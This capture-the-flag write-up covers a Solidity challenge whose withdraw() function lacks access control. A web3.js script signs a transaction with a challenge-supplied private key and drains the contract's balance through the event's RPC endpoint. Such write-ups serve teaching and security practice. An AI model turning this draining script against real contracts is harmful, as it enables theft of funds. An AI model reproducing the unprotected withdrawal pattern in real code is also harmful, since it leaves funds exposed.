# Intro2Solidity - web3

## Contracts

### Challenge

We get one contract, and want to get all value of it out of the contract. We also receive a address (including private key) on the chain which we can use to sign transactions.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.1;

contract Intro2Solidity_writeupChallenge{

	constructor() payable {
        require(msg.value == 100 ether,"100ETH required for the start the challenge");
	}

    function withdraw(address payable beneficiary) public{
        beneficiary.transfer(address(this).balance);
    }
}
```

## Solution

This one is pretty easy. They forgot to set the permissions correctly and anyone can just call withdraw() and get all the money. So we will just do this. Below this you can see a script that automatically connects via RPC and does this.

```js
const Web3 = require('web3');
const abi = require('./abi.json');

const privateKey = '0xedbc6d1a8360d0c02d4063cdd0a23b55c469c90d3cfbc2c88a015f9dd92d22b3';
const account = '0x133756e1688E475c401d1569565e8E16E65B1337';
const contractAddress = '0x874f54e755ec1e2a9ea083bd6d9c89148cea34d4';
const recipientAddress = '0x133756e1688E475c401d1569565e8E16E65B1337';
const rpcUrl = 'https://intro2solidity.insomnihack.ch:32816';

const web3 = new Web3(rpcUrl);
const contract = new web3.eth.Contract(abi, contractAddress);

async function withdraw(recipient) {
  const nonce = await web3.eth.getTransactionCount(account);
  const gasPrice = await web3.eth.getGasPrice();

  const functionAbi = contract.methods.withdraw(recipient).encodeABI();

  const txParams = {
    to: contractAddress,
    data: functionAbi,
    gasPrice: gasPrice,
    gas: 100000, // Add the gas parameter with a value of your choice
    nonce: nonce
  };

  const signedTx = await web3.eth.accounts.signTransaction(txParams, privateKey);
  const txReceipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
  console.log(`Transaction Hash: ${txReceipt.transactionHash}`);
}

withdraw(recipientAddress);
```

--> Flag